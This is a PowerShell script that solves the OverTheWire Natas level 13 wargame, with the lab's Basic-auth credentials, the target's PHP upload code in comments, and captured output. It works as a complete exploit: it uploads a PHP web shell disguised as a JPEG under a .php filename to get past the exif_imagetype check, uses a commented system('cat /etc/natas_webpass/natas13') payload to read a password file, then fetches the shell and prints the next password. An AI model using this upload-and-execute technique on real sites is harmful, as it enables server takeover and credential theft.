
<#
Script to retrieve the password of level 9-10

#>
$url = "http://natas13.natas.labs.overthewire.org"
$creds = "natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
$a = (Invoke-WebRequest -uri $url -Method Post -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# $a



# <h1>natas13</h1>
# <div id="content">
# For security reasons, we now only accept image files!<br/><br/>


# <form enctype="multipart/form-data" action="index.php" method="POST">
# <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
# <input type="hidden" name="filename" value="9tlnpcv4ky.jpg" />
# Choose a JPEG to upload (max 1KB):<br/>
# <input name="uploadedfile" type="file" /><br />
# <input type="submit" value="Upload File" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>

#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------
# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean

# if(array_key_exists("filename", $_POST)) {
#     $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
#     
#     $err=$_FILES['uploadedfile']['error'];
#     if($err){
#         if($err === 2){
#             echo "The uploaded file exceeds MAX_FILE_SIZE";
#         } else{
#             echo "Something went wrong :/";
#         }
#     } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
#         echo "File is too big";
#     } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
#         echo "File is not an image";
#     } else {
#         if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
#             echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
#         } else{
#             echo "There was an error uploading the file, please try again!";
#         }
#     }
# } else {
# ?>



# <form enctype="multipart/form-data" action="index.php" method="POST">
# <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
# <input type="hidden" name="filename" value="ltddjdvzgk.jpg" />
# Choose a JPEG to upload (max 1KB):<br/>
# <input name="uploadedfile" type="file" /><br />
# <input type="submit" value="Upload File" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>



# --------------------------------------------------------------------------------
#Upload image
# Set params and upload 
#
# PS /home/voltron/OTW/natas/pshell_lang> cat ./shell.php
# <?php echo "b3twiise"?> for test 
#<?php system("cat /etc/natas_webpass/natas13")?> When confident
# PS /home/voltron/OTW/natas/pshell_lang> 

$filename = ($a | select-string -pattern "(\w{10}\.jpg)").matches[0].value
# $filename

$parms = @{"MAX_FILE_SIZE" = "1000"
 "filename" =  $filename.split(".")[0] + ".php"
 # "uploadedfile" = Get-Item -Path "./shell.php" 
  "uploadedfile" = Get-Item -Path "./shell_img.php"
"submit" = ""
}
# $parms
# Name                           Value                                                                                                          ----                           -----                                                                                                          submit                                                                                                                                        
# uploadedfile                   /home/voltron/OTW/natas/pshell_lang/shell.php
# filename                       hqz3jkr3k3.php
# MAX_FILE_SIZE                  1000



$a = (Invoke-WebRequest -uri $url -Method Post -Form $parms -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
#$a
#...The file <a href="upload/mtquqdhju5.php">upload/mtquqdhju5.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>...

#-----------------------------------------------------------------------------------------------------------

# Get image upload link
$imgPath = $a | select-string -pattern "(upload/\w{10}\.php)"
$imgPath =  $imgPath.matches[0].value
#upload/mtquqdhju5.php

$imgPath = $url + '/' + $imgPath

$a = (Invoke-WebRequest -uri $imgPath -Method Get  -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 

$passwd = $a


echo "The password for natas14 is $passwd"



# PS /home/voltron/OTW/natas/pshell_lang> 
# ./natas14.ps1                                                                                         
# The password for natas14 is ���Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1                                                                                                                                                                                                                             
# PS /home/voltron/OTW/natas/pshell_lang>  

